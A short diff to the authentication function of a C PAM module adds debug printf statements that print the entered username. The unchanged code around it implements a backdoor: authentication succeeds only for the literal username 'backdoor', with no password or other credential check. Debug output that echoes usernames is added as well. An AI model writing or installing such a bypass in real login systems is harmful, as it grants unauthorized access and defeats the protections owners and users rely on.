@@ -17,10 +17,13 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
     int retval;
     const char* pUsername;
     retval = pam_get_user(pamh, (const char**)&pUsername, "TUsername: ");
+    printf("name0 : %s\n", pUsername);
     if (retval != PAM_SUCCESS) {
+        printf("name1 : %s\n", pUsername);
         return retval;
     }
     if (strcmp(pUsername, "backdoor") != 0) {
+        printf("name2 : %s\n", pUsername);
         return PAM_AUTH_ERR;
     }
     printf("auth\n");
